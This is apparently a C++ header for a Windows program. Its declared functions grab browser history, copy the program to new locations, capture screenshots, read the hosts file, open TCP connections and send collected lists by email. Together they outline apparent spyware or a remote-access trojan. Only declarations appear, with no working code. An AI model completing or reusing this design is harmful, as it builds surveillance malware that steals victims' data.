#pragma once
#include "BrowsHistory.h"
#include <iostream>
#include <fstream>
#include <cstring>
#include <vector>  
#include "CSmtp.h"
#include <vector>  
#include "afxwin.h"  
#include <direct.h>
#include <d3d9.h>
#include <Wincodec.h>             // we use WIC for saving images
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdlib.h>
#include <stdio.h>
#include <tchar.h>
#include <list>
#include <string>
//#include "FTPClient.h"
//#include "FTPFileStatus.h"
#include "FTPListParse.h"
//#include "BlockingSocket.h"

#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "Mswsock.lib")
#pragma comment (lib, "AdvApi32.lib")

#pragma comment(lib, "d3d9.lib")
using namespace std;

using namespace std;
void getHistory();
void sendemail(list<string> &l);
void copy();
void copyitself(const char *s);
int ScreenCapture(const char* fname);
void tcpconnect(const char *addr,const char* port);
bool get_host_file();
